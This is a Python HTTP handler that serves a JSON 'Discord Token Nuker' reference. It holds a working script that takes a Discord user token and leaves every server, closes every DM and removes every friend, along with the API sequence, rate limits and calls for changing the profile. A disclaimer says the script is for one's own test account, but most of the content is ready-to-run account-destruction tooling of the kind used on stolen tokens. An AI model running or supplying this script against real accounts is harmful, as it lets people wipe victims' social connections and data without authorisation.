from http.server import BaseHTTPRequestHandler
import json

INFO = {
    "tool": "Discord Token Nuker — Reference",
    "disclaimer": "Technical reference only. Self-destructing your own test account for research purposes. Doing this to others is unauthorized access and illegal.",
    "what_is_token_nuking": "Token nuking means using a Discord user token to rapidly delete/modify all data tied to that account: leave servers, delete DMs, block friends, then optionally delete the account.",
    "actions_sequence": [
        "1. GET /users/@me/guilds — list all joined servers",
        "2. DELETE /users/@me/guilds/{guild_id} — leave each server",
        "3. GET /users/@me/channels — list all DM channels",
        "4. DELETE /channels/{channel_id} — close each DM",
        "5. GET /users/@me/relationships — list friends",
        "6. DELETE /users/@me/relationships/{user_id} — remove each friend",
        "7. DELETE /users/@me — delete the account (requires password, not just token)"
    ],
    "python_snippet": """import requests, time

# EDUCATIONAL REFERENCE ONLY — use on your own test accounts
TOKEN = "YOUR_USER_TOKEN"
headers = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Leave all servers
guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json()
for g in guilds:
    requests.delete(f"https://discord.com/api/v10/users/@me/guilds/{g['id']}", headers=headers)
    time.sleep(0.5)

# Close all DMs
channels = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers).json()
for c in channels:
    if c.get("type") in (1, 3):  # DM or Group DM
        requests.delete(f"https://discord.com/api/v10/channels/{c['id']}", headers=headers)
        time.sleep(0.3)

# Remove all friends
rels = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers).json()
for r in rels:
    requests.delete(f"https://discord.com/api/v10/users/@me/relationships/{r['id']}", headers=headers)
    time.sleep(0.3)

print("Done — account stripped")
""",
    "rate_limits": {"global": "50 req/s", "per_route": "5 req/s"},
    "related_apis": {
        "change_bio": "PATCH /users/@me with {bio: '...'}",
        "change_username": "PATCH /users/@me with {username: '...', password: '...'}",
        "change_avatar": "PATCH /users/@me with {avatar: 'data:image/png;base64,...'}",
        "set_status": "PATCH /users/@me/settings with {status: 'online'|'idle'|'dnd'|'invisible'}"
    }
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(INFO, indent=2).encode())

    def log_message(self, *a): pass
